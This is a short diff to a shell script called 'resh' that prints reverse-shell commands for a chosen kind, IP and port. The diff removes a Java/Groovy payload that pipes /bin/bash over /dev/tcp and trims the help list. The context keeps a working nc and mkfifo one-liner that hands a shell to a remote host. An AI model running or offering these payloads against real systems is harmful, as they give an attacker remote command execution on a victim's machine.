@@ -34,15 +34,11 @@ case $1 in
     echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "$2" "$3 " >/tmp/f"
     ;;
 
-  java)
-    printf "r = Runtime.getRuntime()\np = r.exec([\x22/bin/bash\x22,\x22-c\x22,\x22exec 5<>/dev/tcp/"$2"/"$3";cat <&5 | while read line; do \$line 2>&5 >&5; done\x22] as String[])\np.waitFor()\n"
-    ;;
-
   *)
     printf "\nReverse shell commands!\n"
     printf "\nUsage\n$ resh <kind> <ip> <port>\n"
     printf "\nExample\n$ resh sh 192.168.0.1 9001\n"
-    printf "\nKinds\n- sh\n- bash\n- perl\n- py\n- php\n- ruby\n- nc\n- nc2 (for nc versions without -e)\n- java\n"
+    printf "\nKinds\n- sh\n- bash\n- perl\n- py\n- php\n- ruby\n- nc\n- nc2 (for nc versions without -e)\n"
     ;;
 
 esac
